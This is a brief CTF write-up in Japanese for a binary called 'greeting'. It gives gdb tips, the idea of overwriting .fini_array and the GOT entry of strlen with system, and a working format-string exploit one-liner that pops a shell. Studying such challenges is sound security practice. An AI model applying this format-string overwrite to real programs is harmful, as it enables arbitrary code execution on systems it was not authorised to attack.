# Greeting

## ポイント
- gdbで`run`するとすぐに止まる
  →デバッガは、今動いているプロセスを追うので、子プロセスを作成されると止まってしまう。
  こういう場合は、`set follow-fork-mode parent`というコマンドで対応できる。
- 書き換えるべき関数がprintfの後に呼ばれていない！
  →デストラクタを書き換えればよい。
  ` readelf -S greeting` で`.fini_array` を見る。
- socatでリモート環境を再現しようとしてもうまくいかない
  →しゃーなし、ローカルでechoする



## 解答

`.fini_array` -> `main`

`strlen` -> `system` 



```
echo -e 'aa\x56\x9a\x04\x08\x54\x9a\x04\x08\x34\x99\x04\x08%2020x%12$hn%31884x%13$hn%349x%14$hn\nsh\nls' | ./greeting
```

